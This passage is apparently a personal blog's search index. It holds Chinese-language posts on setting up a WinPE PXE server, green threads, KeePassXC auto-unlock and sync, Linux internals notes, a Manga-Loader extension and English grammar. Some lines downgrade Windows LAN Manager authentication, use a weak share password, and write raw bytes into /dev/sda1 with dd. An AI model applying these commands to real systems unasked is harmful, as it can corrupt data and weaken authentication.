/index:1 /mountdir:C:\\winpe_amd64\\mount copy PXE 開機檔案 copy c:\\winpe_amd64\\mount\\windows\\boot\\pxe\\*.* c:\\tftproot\\Boot boot.sdi copy C:\\winpe_amd64\\media\\boot\\boot.sdi c:\\tftproot\\Boot boot.wim copy C:\\winpe_amd64\\media\\sources\\boot.wim c:\\tftproot\\Boot 字型 copy C:\\winpe_amd64\\media\\Boot\\Fonts c:\\tftproot\\Boot\\Fonts BCD(bootloader) 生BCD檔 bcdedit /createstore c:\\BCD bcdedit /store c:\\BCD /create {ramdiskoptions} /d \u0026quot;Ramdisk options\u0026quot; bcdedit /store c:\\BCD /set {ramdiskoptions} ramdisksdidevice boot bcdedit /store c:\\BCD /set {ramdiskoptions} ramdisksdipath \\Boot\\boot.sdi 這裡的root就是tftp的root bcdedit /store c:\\BCD /create /d \u0026quot;winpe boot image\u0026quot; /application osloader 把剛剛的GUID複製下來 設定BCD bcdedit /store c:\\BCD /set {18baf49f-d429-11eb-b837-000c299a782c} device ramdisk=[boot]\\Boot\\boot.wim,{ramdiskoptions} bcdedit /store c:\\BCD /set {18baf49f-d429-11eb-b837-000c299a782c} path \\windows\\system32\\winload.exe 這個是boot.wim裡面的path，但要注意是用BIOS還是UEFI winload.exe會用BIOS winload.efi會用UEFI bcdedit /store c:\\BCD /set {18baf49f-d429-11eb-b837-000c299a782c} osdevice ramdisk=[boot]\\Boot\\boot.wim,{ramdiskoptions} bcdedit /store c:\\BCD /set {18baf49f-d429-11eb-b837-000c299a782c} systemroot \\windows bcdedit /store c:\\BCD /set {18baf49f-d429-11eb-b837-000c299a782c} detecthal Yes bcdedit /store c:\\BCD /set {18baf49f-d429-11eb-b837-000c299a782c} winpe Yes bcdedit /store c:\\BCD /create {bootmgr} /d \u0026quot;boot manager\u0026quot; bcdedit /store c:\\BCD /set {bootmgr} timeout 30 bcdedit /store c:\\BCD -displayorder {18baf49f-d429-11eb-b837-000c299a782c} -addlast copy BCD copy c:\\BCD c:\\tftproot\\Boot (Optional) 如果要用UEFI，要複製bootmgfw.efi copy C:\\winpe_amd64\\mount\\Windows\\Boot\\EFI\\bootmgfw.efi c:\\tftproot\\Boot 自定義winpe啟動腳本 改Windows\\System32\\startnet.cmd，所以用剛剛的例子路徑是 c:\\winpe_amd64\\mount\\Windows\\System32\\startnet.cmd\n這裡直接把iso透過smbda掛上去，再call setup.exe\nnet use Z: \\\\192.168.123.1\\TFTPRoot\\iso iso /user:192.168.123.1\\iso Z:setup.exe 改完要寫回去boot.wim\nDism /Unmount-Image /MountDir:\u0026#34;C:\\WinPE_amd64\\mount\u0026#34; /commit net use一直出事 一個是net use的問題，我試了好幾次最後試出來是上面那樣 windows的網路權限問題 按Win + R輸入secpol.msc Local Policies -\u0026gt; Security Options 裡面找Network Security: LAN Manager authentication level 換成LM and NTLM – use NTLMv2 session security if negotiated reboot 也可以用rededit改找 HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa改成5\n怎麼設定tftp tftp主要就是\n設定root 勾pxe支援(如果有的話) 如果是在linux上跑，還要多remap，因為path的表示方式不一樣 大概像下面這樣 怎麼設定dhcp dhcp除了基本的ip range還有一個是boot file\nboot file就是pxe client要怎麼載入初始環境(win是winpe, linux是initrd)的指示檔案 這裡是用UEFI，所以路徑放\\Boot\\bootmgfw.efi\n大概像下面這樣 怎麼call到iso 在tftp的root中放一個iso的資料夾，裡面放iso的內容 設定成公開(要可以用smbda連) 創一個有密碼的帳號(我這裡是給iso/iso) Ref 設定 PXE 伺服器以載入 Windows PE Utils, Windows, 10 Password Error with Samba Share If you try to mount a share on windows 2008 R2 server the system still prompt for credential even if you type them correctly 設定 PXE 伺服器以載入 Windows PE Boot WINPE over PXE on a UEFI computer WinPE: Mount and Customize\n","permalink":"https://littlebees.github.io/2021/06/windows%E4%B8%8A%E7%94%A8win10%E7%9A%84pxe%E6%AA%94%E6%A1%88%E8%88%87%E6%9E%B6pxe-server/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我找不到我的隨身碟，剩下的sd卡也掉到某個床縫中，暫時拿不到\n只好來研究怎麼用網路來裝OS了\u003c/p\u003e\n\u003cp\u003e原本用serva，好不容易用完，開機之後發現帳密不管怎麼打都不對，就只好自立自強了\u003c/p\u003e","title":"windows上用win10的pxe檔案與架pxe server"},{"content":"動機 偶然找到Green Threads Explained很讚，做點筆記\nthread要有? scheduler 因為要schedule，所以要context switch context switch要換的是當下執行的狀態，所以要看 arch(x86, amd64, arm)的ABI arch的reg 實作? 這裡就看我覺得重要的地方\nstruct gt thread的狀態，兩件事\n紀錄當下執行的狀態，或是說在cpu運算會用到的reg reg其實可以當成cpu的狀態 同理，可以把這個概念推廣成在一般自己的function會用到的參數都是function的狀態 thread的狀態 struct gt { struct gtctx { uint64_t rsp; // Stack pointer for top address of the stack uint64_t r15; // I dont know uint64_t r14; uint64_t r13; uint64_t r12; uint64_t rbx; // Base index (for use with arrays) uint64_t rbp; // Stack base pointer for holding the address of the current stack frame. } ctx; enum { Unused, Running, Ready, // has rest of works } st; }; context switch 這要同時看gtgo與gtswtch\ngtgo負責\n設給cpu用的stack，這 對pc(program counter)動手腳 我們沒辦法直接改pc，所以要利用stack動手腳 stack第一層放gtstop，第二層放f 第二層會在gtswtch(context switch)的ret，被拿出來跑到f去 stack第一層會在f直接call時利用到，return就直接到gtstop *(uint64_t *)\u0026amp;stack[StackSize - 8] = (uint64_t)gtstop; *(uint64_t *)\u0026amp;stack[StackSize - 16] = (uint64_t)f; p-\u0026gt;ctx.rsp = (uint64_t)\u0026amp;stack[StackSize - 16]; gtswtch就是把reg存起來，但問題是從哪到哪? 怎麼看old與new?\n看gtswtch怎麼被call的 gtswtch(old, new); arch的ABI ABI會說，reg要怎麼用，像function的參數要怎麼帶 這裡rdi是第一個參數，rsi是第二個參數 gtswtch: mov %rsp, 0x00(%rdi) mov %r15, 0x08(%rdi) mov %r14, 0x10(%rdi) mov %r13, 0x18(%rdi) mov %r12, 0x20(%rdi) mov %rbx, 0x28(%rdi) mov %rbp, 0x30(%rdi) mov 0x00(%rsi), %rsp mov 0x08(%rsi), %r15 mov 0x10(%rsi), %r14 mov 0x18(%rsi), %r13 mov 0x20(%rsi), %r12 mov 0x28(%rsi), %rbx mov 0x30(%rsi), %rbp ret 整體邏輯 一個array去放thread，之後在yield被call時，換(這裡用RR去選)到下一個thread\nGoroutines Goroutines也是cooperative thread，與Green Threads Explained一樣，但感覺怪怪的?\nGoroutines沒有yield yield是runtime叫的\nChannel send and receive operations, if those operations would block. The Go statement, although there is no guarantee that new goroutine will be scheduled immediately. Blocking syscalls like file and network operations. After being stopped for a garbage collection cycle. syscall不會block其他threadㄟ 所以go會把出事的thread放到其他OS thread去跑，畢竟syscall會block\n這也是Goroutines要分成下面三個的理由\nG (green thread) M (OS thread，真正做事的) P (運行G的context) 如果G發syscall就會讓M被卡，所以需要P讓其他G可以避難到其他M去\nGoroutines的context switch比較快? go只保留需要的reg\nsince it is invoked implicitly in the code e.g. during sleep or channel wait, the compile only needs to safe/restore the registers which are alive at these points. In Go, this means only 3 registers i.e. PC, SP and DX (Data Registers) being updated during context switch rather than all registers\nRef The Go scheduler Why goroutines are not lightweight threads?\n","permalink":"https://littlebees.github.io/2021/06/green-threads-explained%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e偶然找到\u003ca href=\"https://c9x.me/articles/gthreads/intro.html\"\u003eGreen Threads Explained\u003c/a\u003e很讚，做點筆記\u003c/p\u003e","title":"Green Threads Explained筆記"},{"content":"動機 keepass2真的有點慢，所以換回去keepassxc，同時找一個辦法避免每次開機都要打master key 所以我把dropbox給裝上去了\nwindows 存master key 先到認證館管理員加master key，雖然說是明碼，但總比直接寫在script上好 裝CredentialManager Install-Module -Name CredentialManager -Scope CurrentUser 在powershell就可以用下面的script拿密碼 (Get-StoredCredential -Target keepassxc).GetNetworkCredential().password | keepassxc.exe --pw-stdin --keyfile $keyfile_path $dbfile_path --localconfig $localconf_path --config $conf_path 開機時執行 在startup中放跑指令的捷徑，這捷徑不能用New-Item去生，Value的檢查不會過\n$WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(\u0026#34;$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mykeepassxc.lnk\u0026#34;) $Shortcut.TargetPath = \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; $Shortcut.Arguments = \u0026#34;/c start /min `\u0026#34;`\u0026#34; powershell -WindowStyle Hidden -Command `\u0026#34;$home\\MyKeepassXC\\StartCustomKeepass.ps1`\u0026#34;\u0026#34; $Shortcut.IconLocation = \u0026#34;C:\\Program Files\\KeePassXC\\KeePassXC.exe\u0026#34; $Shortcut.save() ScheduledJob (keepassxc會跑在背景，會看不到) 用管理者權限開powershell 用下面的script就能在開機時跑指定的腳本 $trigger = New-JobTrigger -AtStartup Register-ScheduledJob -Trigger $trigger -FilePath $home\\MyKeepassXC\\StartCustomKeepass.ps1 -Name StartCustomKeepass 設定hardlink 這裡是把local的config與dropbox的連在一起，只要改了設定就能同步到其他台\nfunction Set-ConfAsHardLink { param ( [string]$HostPath, [string]$CloudPath ) if(!(Test-Path -Path $HostPath)) { New-Item -ItemType HardLink -Path $HostPath -Value $CloudPath } elseif(!(Get-ItemProperty $HostPath).LinkType -eq \u0026#34;HardLink\u0026#34;) { Remove-Item $HostPath New-Item -ItemType HardLink -Path $HostPath -Value $CloudPath } } Set-ConfAsHardLink -HostPath \u0026#34;$home\\AppData\\Local\\KeePassXC\\keepassxc.ini\u0026#34; -CloudPath $localconf_path Set-ConfAsHardLink -HostPath \u0026#34;$home\\AppData\\Roaming\\KeePassXC\\keepassxc.ini\u0026#34; -CloudPath $conf_path powershell試用感想 把指令存成string 整體操作起來很像物件，但是還是有不順手的地方，像keepassxc.exe因為沒有加到PATH所以要放絕對路徑\n但是，直接用環境變數湊出來的路徑會有space!! 不會自己跳掉，所以沒辦法直接放到變數這個時候要用Invoke-expression\n然而，Invoke-expression前面接pipe，跑出來個結果不對，但是把pipe包到整個Invoke-expression又很長 所以就變成不存變數直接展開了，原本以為所有指令都可以當成一級函數亂丟，結果不行\nsudo powershell沒有sudo，有人寫，但要裝 可以用runas，但是會彈出另一個視窗，不適合script去跑\n對一個bash用習慣的人來說真的不習慣\n物件 指令跑完可以像物件一樣存取，函數也是用named args，十分人性化，這點一定要給好評 還有居然可以在script看到type!! 這真的太贊了\nlinux(ubuntu) 存master key 用keyring 開機時執行 加下面的內容到.config/autostart/StartCustomKeepass.sh.desktop，沒有folder自己建 [Desktop Entry] Type=Application Exec=$HOME/MyKeepassXC/StartCustomKeepass.sh Hidden=false NoDisplay=false X-GNOME-Autostart-enabled=true Name[en_US]=keepassxc Name=keepassxc Comment[en_US]= Comment= 難搞的systemd systemd可以管理proc的生存狀態，但是我真的用不起來，一個是所有指令要用絕對路徑 另一個最重要的是，我的keyring或是secret-tool在systemd中都拿不到密碼，這應該與keyring的實現機制有關，之後再看看\n設定hardlink linux沒有指令可以區分hardlink與一般file，只能用inode的編號\nSet_ConfAsHardLink() { hostPath=$1 cloudPath=$2 if [ ! -f $hostPath ]; then ln $cloudPath $hostPath else hostInode=$(ls -i $hostPath | awk \u0026#39;{print $1 }\u0026#39;) cloudInode=$(ls -i $cloudPath | awk \u0026#39;{print $1 }\u0026#39;) if [ $hostInode -eq $cloudInode ]; then rm $hostPath ln $cloudPath $hostPath fi fi } Set_ConfAsHardLink $host_localconf_path $localconf_path Set_ConfAsHardLink \u0026#34;$HOME/.config/keepassxc/keepassxc.ini\u0026#34; $conf_path KeeShare 這個功能就是我想跳回來的其中一個理由\nKeeShare就像分割db，可以選某個folder給別人看或改\n使用步驟 先開keepassxc的keeshare讓他可以讀與寫keeshare的檔案 (只要設定一次) 到需要分出去的folder點編輯群組 到keeshare，選匯出(只寫出去)或同步(寫出去也接收其他的新增)，存keeshare的檔案 開一個新的db檔，創一個folder 到keeshare，選匯入(只收來自source的更改)或同步(寫出去也接收其他的新增) 如果選同步可以在新的db寫一個entry，去存，之後到原本的db去看，會看到新的entry Ref Automatic Database Opening Database Sharing with KeeShare\nHow to store and read user credentials from Windows Credentials manager\n","permalink":"https://littlebees.github.io/2021/06/keepassxc%E5%90%8C%E6%AD%A5db%E8%88%87%E8%87%AA%E5%8B%95%E9%96%8Bdb/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003ekeepass2真的有點慢，所以換回去keepassxc，同時找一個辦法避免每次開機都要打master key\n所以我把dropbox給裝上去了\u003c/p\u003e","title":"keepassxc同步db與自動開db"},{"content":"動機 都買了就讀一下\nch1 cpu至少有兩種模式 user mode kernel mode: 可以access所有記憶體 ch2 sys call 目的: 讓user space的proc調用kernel space的功能，以操作或取得底層的資源 用eval+apply的interp的角度去看，sys call就像primitive opertor proc, mem, file, IPC, network, IO, time, \u0026hellip;. 過程: 塞sys call的編號到reg 發中斷(trap) cpu切到kernel mode 請cpu跑sys call cpu根據sys call的數字去看表 cpu跑kernel寫好的對應的handler 丟return 值，轉回去user mode 一些指令 sar -P ALL 1: (mpstat) 可以看cpu的load user% + nice%: cpu是執行在user space的時間佔比 user%: 就是一般的proc跑的 nice%: 有被調過nice有特權的proc所跑的時間 sys%: cpu是執行在kernel space的時間佔比，也就是跑sys call的時間 strace -T: 顯示proc所執行的每個sys call與花了多少時間 ldd: 看exe有link到哪些lib ch3 fork, execve: skip here exe info exe的結構有三個部分 info: 在linux是elf，會有很多資訊但對exe的結構來說重要的是 每個部份的 起點addr (fake addr) 長度 mapping後的起點addr (real addr) entry point code data 一些指令 readelf -S: 可以拿到起點addr與長度 cat /proc/\u0026lt;pid\u0026gt;/maps: 可以看proc的memory mapping ch4 proc scheduler: round-robin 1個cpu只會跑1個proc 每個proc都享有相同的時間去分cpu(沒nice的話) 有nice的proc分到的cpu時間會比較多 在書中有一個程式是會fork多個proc(work load都一樣)去看分到的時間與執行狀況 總執行時間隨fork出的proc變多而跟著上升 因為throughput不變，故隨著proc數上升，proc的latency(end_time-start_time)也會上升 多cpu時會把proc往最少proc的cpu塞 一些指令 tasklet -c \u0026lt;cpuid\u0026gt; \u0026lt;cmd\u0026gt;: 強制cmd跑在cpuid的cpu上 time ... proc state的變化大概像 run(a) | sleep | run(c) | sleep real: end_time-start_time user: user space sys: kernel space user+sys就是把所有run時間加起來 proc state executing waiting sleeping D: wait IO S: wait signal zombie ch5 virtual mem purpose: proc isolation C有ptr可以亂指，有virtual mem就指不出去 不過如果沒有ptr是不是就可以不用virtual mem? avoid mem fragment support of multiple procs implement: page table 可以當成一個存在於kernel的函數，all fake addr -\u0026gt; all real addr demang page: lazy evaluation 直到proc寫入時kernel才去找一個real addr malloc是從先拿到的mem pool中拿addr，但mmap是sys call就是直接拿 table太大了 階層式page table 從list變成tree，all fake addr -\u0026gt; (another table OR all real addr) huge page 把page的單位變大，讓table的item數量變少 file mapping: 把file複製到mem操作，最後在適當的時候把對file的改動寫回去 copy-on-write: 在fork時parent與child proc共用相同的Page，當其中一方改動時才複製新的，並把fake addr指到新的page上 在算proc使用的mem時會各自顯示所以佔有的mem，但是因為copy-on-write實際上的mem使用量沒那麼多 swap swap-in: mem -\u0026gt; swap(hdd) swap-out: mem \u0026lt;- swap(hdd) 持續 swap-in \u0026amp; swap-out: thrashing VSS \u0026amp; RSS fake mem usage \u0026amp; real mem usage 都有用完的機會，VSS是當table不夠時，RSS就是真的沒了 一些指令 free total: 插了多少記憶體 buff: 緩衝快取 (使用緩衝記憶體的快取) cache: 分頁快取 (使用kernel space記憶體去快取file的快取) avail: kernel space與user space的可以用的mem總和 ch6 cache mem 裡面就是一張表 name val is_dirty localty: time \u0026amp; space 讓proc同一時間使用的mem越少越好 transition lookaside buffer proc取值要 從fake addr換real addr 從real addr換值 (有cache的機會) 從fake addr換real addr是記憶體即便後面有cache主要的overhead還是吃在第一個 所以多一個buffer來把fake addr換成val 一些指令 /sys/system/cpu/cpu\u0026lt;i\u0026gt;/cache/index\u0026lt;j\u0026gt; type: data, code, unified shared_cpu_list size: total mem coherency_line_size: unit size page cache 把file讀到kernel的mem去cahce 所以在第一次之後的讀寫，不會每次都跑到HDD去(page in(HDD-\u0026gt;mem)/out(mem-\u0026gt;HDD)沒有上升) 寫就會由kernel處理dirty的部分來做 一些指令 sar -d -p: HDD stat sat -B: page in/out sysctl vm.dirty_... echo 3 \u0026gt; /proc/sys/vm/drop_cache: remove all cache hyper thread proc state的變化大概像 run(a) | sleep | run(c) | sleep 如果有多的reg的話可以在sleep時讓cpu當成一顆新的cpu去跑其他proc 所以，hyper thread就是保留一部份reg(一半)，把cpu當成兩顆用 ch7 file system 一定會有 name offset len 是不是很熟悉? 在exe info也有看過一樣的東西 其實就是把會記憶的東西當成一條常常的帶子(圖靈機) 但這樣不會有問題嗎? 特性 是一顆tree (從root開始) 有data與metadata 權限 file size timestamp quota user, folder, sub-disk(brtfs) inconsistent 從a的link改成b的link 加一條到b的link 把原本的a的link刪掉 (在這裡斷電) sol 日誌 在做事前先寫下步驟，在一步一步做 寫完步驟前出事 =\u0026gt; old tree 做到一半出事 =\u0026gt; redo, new tree copy-on-write (persistent data structrue) 每次的新增都是用新的位置 做到一半出事 =\u0026gt; old tree fsck 找出inconsistent做處理 像在加一條到b的link出事會出現兩條link 這是可以選擇砍其中一條或是兩條都砍 device file type character 沒有seek，也就是沒有隨機讀取 可以寫字元與讀字元 用ps可以看到bash的/dev/pts/\u0026lt;n\u0026gt; 可以用echo \u0026lt;cmd\u0026gt; \u0026gt; /dev/pts/\u0026lt;n\u0026gt;與# \u0026lt;cmd\u0026gt;一樣 block 可以當成記憶體 用mount 額外提一個mount --bind olddir newdir 這是把現有的folder連到另一個folder去，olddir的path依舊，但內容是newdir 可以用在olddir無法改變屬性時 strings -t -x可以把block dev的資料用string倒出來with addr 所以可以配合dd if=override_file of=/dev/sda1 seek=$((\u0026lt;addr\u0026gt;)) bs=1來改寫檔案內容 其他fs brtfs 大約等於 lvm+ext4 procfs /proc/\u0026lt;pid\u0026gt; maps cmdline stat /proc cpuinfo, diskstat, meminfo /proc/sys/ sysctl sysfs /sys devices fs tmpfs, cgroupfs, nfs ch8 HDD 轉動很慢 IO scheduler: 在把req送到driver前 merge: 一次讀多一點 sort: 變成seq讀取 preread: 順便把其他的附近的也一起讀出來 SSD 隨著IO單位數的上升 throughput上升 IO scheduler的增益越來越不明顯，甚至損害效能 結論 一次讀多一點，資料量大沒關係 次數越少越好 在HDD與SSD，seq去讀寫的效能都是最好的，資料最好存在連續的區塊 ","permalink":"https://littlebees.github.io/2021/06/%E5%9C%96%E8%A7%A3linux%E6%A0%B8%E5%BF%83%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e都買了就讀一下\u003c/p\u003e","title":"圖解linux核心工作原理整理"},{"content":"動機 manga loader是神器，來試著加加新的網站\n第一次: 從範例找使用方法 因為要加的是新網站，所以要先知道怎麼帶domain\n先找有沒有domain，就會看到像下面\n{ name: \u0026#39;geh-and-exh\u0026#39;, match: \u0026#34;^https?://(e-hentai|exhentai).org/s/.*/.*\u0026#34;, img: \u0026#39;.sni \u0026gt; a \u0026gt; img, #img\u0026#39;, next: \u0026#39;.sni \u0026gt; a, #i3 a\u0026#39;, numpages: \u0026#39;div.sn \u0026gt; div \u0026gt; span:nth-child(2)\u0026#39;, curpage: \u0026#39;div.sn \u0026gt; div \u0026gt; span:nth-child(1)\u0026#39; } 之後很幸運，有註解\nSample Implementation: { name: \u0026#39;something\u0026#39; // name of the implementation , match: \u0026#34;^https?://domain.com/.*\u0026#34; // the url to react to for manga loading , img: \u0026#39;#image\u0026#39; // css selector to get the page\u0026#39;s manga image , next: \u0026#39;#next_page\u0026#39; // css selector to get the link to the next page , numpages: \u0026#39;#page_select\u0026#39; // css selector to get the number of pages. elements like (select, span, etc) , curpage: \u0026#39;#page_select\u0026#39; // css selector to get the current page. usually the same as numPages if it\u0026#39;s a select element , numchaps: \u0026#39;#chapters\u0026#39; // css selector to get the number of chapters in manga , curchap: \u0026#39;#chapters\u0026#39; // css selector to get the number of the current chapter , nextchap: \u0026#39;#next_chap\u0026#39; // css selector to get the link to the next chapter , prevchap: \u0026#39;#prev_chap\u0026#39; // same as above except for previous , wait: 3000 // how many ms to wait before auto loading (to wait for elements to load), or a css selector to keep trying until it returns an elem , pages: function(next_url, current_page_number, callback, extract_function) { // gets called requesting a certain page number (current_page_number) // to continue loading execute callback with img to append as first parameter and next url as second parameter // only really needs to be used on sites that have really unusual ways of loading images or depend on javascript } Any of the CSS selectors can be functions instead that return the desired value. } 所以看來只要帶css selector就好，雖然有看到其他範例是帶function，但這一次用不到所以放著\n第二次: tracing javascript is painful 到了這回，同一個頁面居然有多個圖片!!\n所以要trace裡面怎麼做的，從使用的地方開始會去找，這次要找function的範例\n除了pages之外，function都只吃ctx，看了裡面的用法，ctx因該是dom 在看pages，有4個參數，之前的註解有說大概是什麼，但不清楚也看不懂\n所以要回去看怎麼被call，\nif (imp.pages) { imp.pages(url, curPage, addAndLoad, ex, getPageInfo); } else { var colonIdx = url.indexOf(\u0026#39;:\u0026#39;); if(colonIdx \u0026gt; -1) { url = location.protocol + url.slice(colonIdx + 1); } xhr.open(\u0026#39;get\u0026#39;, url); imp.beforexhr \u0026amp;\u0026amp; imp.beforexhr(xhr); xhr.onload = getPageInfo; xhr.onerror = function() { log(\u0026#39;failed to load page, aborting\u0026#39;, \u0026#39;error\u0026#39;); }; xhr.send(); } 如果有給pages就call沒有就xhr，再去看onload\ngetPageInfo = function() { var page = d.body; d.body.innerHTML = xhr.response; try { // find image and link to next page addAndLoad(ex(\u0026#39;img\u0026#39;, imp.imgmod, page), ex(\u0026#39;next\u0026#39;, null, page)); } catch (e) { if (xhr.status == 503 \u0026amp;\u0026amp; retries \u0026gt; 0) { log(\u0026#39;xhr status \u0026#39; + xhr.status + \u0026#39; retrieving \u0026#39; + xhr.responseURL + \u0026#39;, \u0026#39; + retries-- + \u0026#39; retries remaining\u0026#39;); window.setTimeout(function() { xhr.open(\u0026#39;get\u0026#39;, xhr.responseURL); xhr.send(); }, 500); } else { log(e); log(\u0026#39;error getting details from next page, assuming end of chapter.\u0026#39;); } } } res往addAndLoad灌\naddAndLoad = function(img, next) { if(!img) throw new Error(\u0026#39;failed to retrieve img for page \u0026#39; + curPage); updateStats(); addImage(img, UI.images, curPage, function() { pagesLoaded += 1; updateStats(); }); if(!next \u0026amp;\u0026amp; curPage \u0026lt; numPages) throw new Error(\u0026#39;failed to retrieve next url for page \u0026#39; + curPage); loadNextPage(next); } 這邊的問題是img與next是什麼，如果有type應該就不會這麼麻煩了 他們是dom還是url，所以還要往下看，但不想再貼code，直接據透，是url\n處理完type，再來是看到了只能一張圖的理由，加一張圖就下一頁，所以這邊要改，多一個flag去擋\naddAndLoad = function(img, next, inc_page=true) { if(!img) throw new Error(\u0026#39;failed to retrieve img for page \u0026#39; + curPage); updateStats(); addImage(img, UI.images, curPage, function() { if (inc_page) { pagesLoaded += 1; updateStats(); } }); if (inc_page) { if(!next \u0026amp;\u0026amp; curPage \u0026lt; numPages) throw new Error(\u0026#39;failed to retrieve next url for page \u0026#39; + curPage); loadNextPage(next); } } 之後把addAndLoad與pages的知識加起來，所以要自己寫個pages大概像\n發xhr 把所有img拉出來 用addImage塞圖 最後一個再把flag丟回去 var getPageInfo2 = function(xhr,addAndLoad, img_css, next_css) { return function() { var ctx = document.implementation.createHTMLDocument(); ctx.body.innerHTML = xhr.response; try { // find image and link to next page var nextUrl = getEl(next_css, ctx).href; var imgs = getEls(img_css, ctx).map(function(page) { return page.src; }); for(let i=0;i\u0026lt;imgs.length-1;i++) { addAndLoad(imgs[i],\u0026#39;whatever\u0026#39;,false); } addAndLoad(imgs[imgs.length-1],nextUrl,true); } catch (e) { if (xhr.status == 503 \u0026amp;\u0026amp; retries \u0026gt; 0) { log(\u0026#39;xhr status \u0026#39; + xhr.status + \u0026#39; retrieving \u0026#39; + xhr.responseURL + \u0026#39;, \u0026#39; + retries-- + \u0026#39; retries remaining\u0026#39;); window.setTimeout(function() { xhr.open(\u0026#39;get\u0026#39;, xhr.responseURL); xhr.send(); }, 500); } else { log(e); log(\u0026#39;error getting details from next page, assuming end of chapter.\u0026#39;); } } }; }; { name: \u0026#39;taotu55\u0026#39;, match: \u0026#34;^https?://www.taotu55.net/w/.*/.*\u0026#34;, img: \u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(1) \u0026gt; div.content \u0026gt; img\u0026#39;, next: \u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(2) \u0026gt; div.NewPages \u0026gt; ul \u0026gt; li:last-child \u0026gt; a\u0026#39;, numpages: function(ctx) { var last = getEl(\u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(2) \u0026gt; div.NewPages \u0026gt; ul \u0026gt; li:nth-last-child(1) \u0026gt; a\u0026#39;,ctx).text; if (!isNaN(last)) { return parseInt(last,10); } else { return parseInt(getEl(\u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(2) \u0026gt; div.NewPages \u0026gt; ul \u0026gt; li:nth-last-child(2) \u0026gt; a\u0026#39;,ctx).text, 10); } }, pages: function(url, num, cb, ex,idontcare,ctx) { var colonIdx = url.indexOf(\u0026#39;:\u0026#39;); var xhr = new XMLHttpRequest(); if(colonIdx \u0026gt; -1) { url = location.protocol + url.slice(colonIdx + 1); } xhr.open(\u0026#39;get\u0026#39;, url); xhr.onload = getPageInfo2(xhr,cb, this.img, this.next); xhr.onerror = function() { log(\u0026#39;failed to load page, aborting\u0026#39;, \u0026#39;error\u0026#39;); }; xhr.send(); }, curpage: \u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(2) \u0026gt; div.NewPages \u0026gt; ul \u0026gt; li.thisclass \u0026gt; a\u0026#39; } 心得 要抱著問題去追，不然會被雜訊干擾 一定要搞懂每個變數實際時的東西(type) 最後一定要能夠知道每個變數是怎麼關聯，為什麼是這個type，他們是怎麼完成要處理的問題(目的) 之後確定(堅定)好自己怎麼做，從之前看的知識組合解法，不然就是回去重新找哪邊有自己需要的資料(變數)，再釐清新的架構 從起點到終點，如果找哪邊有自己需要的資料(變數)時，要先確認與起點(進入點)的距離(怎麼從進入到這裡)，再看終點在哪!! 如果想要改Manga-Loader 簡單的case可以用css selector來完成，只要給\nimg: 圖片 next: 連結 numpages: 數字 curpage: 數字 有點複雜的case可以把上面的selector換成function，至於會餵什麼要去看extractInfo\n主要的function call是 waitAndLoad -\u0026gt; loadManga -\u0026gt; addAndLoad -\u0026gt; loadNextPage -\u0026gt; getPageInfo -\u0026gt; addAndLoad ...\n其中最重要的是loadNextPage中會看imp的pages在不在也就是像\n{ name: \u0026#39;taotu55\u0026#39;, match: \u0026#34;^https?://www.taotu55.net/w/.*/.*\u0026#34;, img: \u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(1) \u0026gt; div.content \u0026gt; img\u0026#39;, next: \u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(2) \u0026gt; div.NewPages \u0026gt; ul \u0026gt; li:last-child \u0026gt; a\u0026#39;, numpages: function(ctx) { var last = getEl(\u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(2) \u0026gt; div.NewPages \u0026gt; ul \u0026gt; li:nth-last-child(1) \u0026gt; a\u0026#39;,ctx).text; if (!isNaN(last)) { return parseInt(last,10); } else { return parseInt(getEl(\u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(2) \u0026gt; div.NewPages \u0026gt; ul \u0026gt; li:nth-last-child(2) \u0026gt; a\u0026#39;,ctx).text, 10); } }, pages: function(url, num, cb, ex,idontcare,ctx) { // ... }, curpage: \u0026#39;body \u0026gt; div.bcen \u0026gt; div:nth-child(2) \u0026gt; div.NewPages \u0026gt; ul \u0026gt; li.thisclass \u0026gt; a\u0026#39; } 就會把調用getPageInfo與addAndLoad交給pages的函數，這樣控制下一頁就是pages來做了，這樣應該可以處理許多case。\n","permalink":"https://littlebees.github.io/2021/06/%E6%94%B9manga-loader%E7%9A%84%E5%BF%83%E5%BE%97%E8%88%87%E4%B8%80%E4%BA%9B%E6%96%B9%E6%B3%95/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003emanga loader是神器，來試著加加新的網站\u003c/p\u003e","title":"改Manga-Loader的心得與一些方法"},{"content":"動機 隨手筆記，不期待有人看懂，就只是做紀錄了\n另外特別感謝google的natural language API\n逗點 Compound Sentence: 為什麼and之前要逗點 要區分是以\n詞 句 為單位，做連接\n一般來說，都是接前面同屬性的詞，但是加了逗點就變成接句子\nComplex Sentence: 為什麼When放前面要逗號 這樣可以放很多句，因為主要句只有一句(以對等連接詞為分界)要修飾，像\nAlthough my mother runs, although my mother runs, I am tall, and she is short, but when she flees, he goes.\n的syntax tree大概像\n( (I am tall (Although my mother runs) (Although my mother runs)) and (she is short) but (he goes (when she flees)) ) 可以看google的natural language API示範的syntax\ndash 可以當成\n逗號 冒號 分號 我在toefl TPO最常看到是當成插入句用，所以會出現兩個dash，像\nIf nature did not cooperate-if the winter proved dry and warm, if the spring thaw was delayed-production would suffer.\n倒裝 SVO =\u0026gt; OSV\n這樣O與S接在一起無法區分兩者，一個是加逗號，那有不加逗號的方法嗎?\n把V放前面? (OVS) 